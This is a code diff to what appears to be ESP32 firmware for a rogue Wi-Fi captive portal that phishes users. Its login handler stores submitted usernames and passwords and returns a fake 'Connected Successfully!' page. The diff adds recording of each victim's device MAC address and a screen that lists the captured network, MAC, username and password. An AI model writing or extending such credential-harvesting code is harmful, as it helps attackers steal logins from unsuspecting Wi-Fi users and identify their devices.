@@ -23,6 +23,7 @@ struct Credential {
     String ssid;
     String username;
     String password;
+    String macAddress;
     unsigned long captureTime;
 };
 
@@ -173,11 +174,36 @@ void handleLogin() {
         newCred.ssid = currentSSID;
         newCred.username = username;
         newCred.password = password;
+
+        String macAddr = "Unknown";
+        wifi_sta_list_t stationList;
+        esp_err_t err = esp_wifi_ap_get_sta_list(&stationList);
+
+        if (err == ESP_OK && stationList.num > 0) {
+            if (stationList.num == 1) {
+                char macStr[18];
+                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                    stationList.sta[0].mac[0], stationList.sta[0].mac[1],
+                    stationList.sta[0].mac[2], stationList.sta[0].mac[3],
+                    stationList.sta[0].mac[4], stationList.sta[0].mac[5]);
+                macAddr = String(macStr);
+            } else {
+                char macStr[18];
+                int lastIdx = stationList.num - 1;
+                snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
+                    stationList.sta[lastIdx].mac[0], stationList.sta[lastIdx].mac[1],
+                    stationList.sta[lastIdx].mac[2], stationList.sta[lastIdx].mac[3],
+                    stationList.sta[lastIdx].mac[4], stationList.sta[lastIdx].mac[5]);
+                macAddr = String(macStr);
+            }
+        }
+
+        newCred.macAddress = macAddr;
         newCred.captureTime = millis();
-        
+
         capturedCreds.push_back(newCred);
     }
-    portalServer.send(200, "text/html", 
+    portalServer.send(200, "text/html",
         "<html><body style='font-family:Arial;text-align:center;padding:50px;'>"
         "<h2>Connected Successfully!</h2>"
         "<p>You are now connected to the internet.</p>"
@@ -354,8 +380,29 @@ void drawCredentialsList() {
         u8g2.setFont(u8g2_font_5x8_tr);
         u8g2.drawStr(0, 62, "L=Back SEL=EXIT");
     } else {
-        u8g2.drawStr(0, 10, "Captured Credentials:");
         const Credential& cred = capturedCreds[credIndex];
+
+        char ssidStr[22];
+        if (cred.ssid.length() > 20) {
+            strncpy(ssidStr, cred.ssid.c_str(), 18);
+            ssidStr[18] = '\0';
+            strcat(ssidStr, "..");
+        } else {
+            strcpy(ssidStr, cred.ssid.c_str());
+        }
+        u8g2.drawStr(0, 10, "Net:");
+        u8g2.drawStr(25, 10, ssidStr);
+
+        char macStr[18];
+        if (cred.macAddress.length() > 17) {
+            strncpy(macStr, cred.macAddress.c_str(), 17);
+            macStr[17] = '\0';
+        } else {
+            strcpy(macStr, cred.macAddress.c_str());
+        }
+        u8g2.drawStr(0, 20, "MAC:");
+        u8g2.drawStr(25, 20, macStr);
+
         char userStr[22];
         if (cred.username.length() > 20) {
             strncpy(userStr, cred.username.c_str(), 18);
@@ -364,8 +411,9 @@ void drawCredentialsList() {
         } else {
             strcpy(userStr, cred.username.c_str());
         }
-        u8g2.drawStr(0, 22, "User:");
-        u8g2.drawStr(30, 22, userStr);
+        u8g2.drawStr(0, 30, "User:");
+        u8g2.drawStr(30, 30, userStr);
+
         char passStr[22];
         if (cred.password.length() > 20) {
             strncpy(passStr, cred.password.c_str(), 18);
@@ -374,16 +422,17 @@ void drawCredentialsList() {
         } else {
             strcpy(passStr, cred.password.c_str());
         }
-        u8g2.drawStr(0, 34, "Pass:");
-        u8g2.drawStr(30, 34, passStr);
+        u8g2.drawStr(0, 40, "Pass:");
+        u8g2.drawStr(30, 40, passStr);
+
         char infoStr[32];
         unsigned long currentTime = millis();
         unsigned long elapsedMs = currentTime - cred.captureTime;
         unsigned long elapsedMinutes = elapsedMs / 60000;
-        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago", 
+        snprintf(infoStr, sizeof(infoStr), "%d/%d - %lum ago",
                 credIndex + 1, (int)capturedCreds.size(), elapsedMinutes);
-        u8g2.drawStr(0, 46, infoStr);
-        
+        u8g2.drawStr(0, 50, infoStr);
+
         u8g2.setFont(u8g2_font_5x8_tr);
         u8g2.drawStr(0, 62, "U/D=Nav L=Back SEL=EXIT");
     }
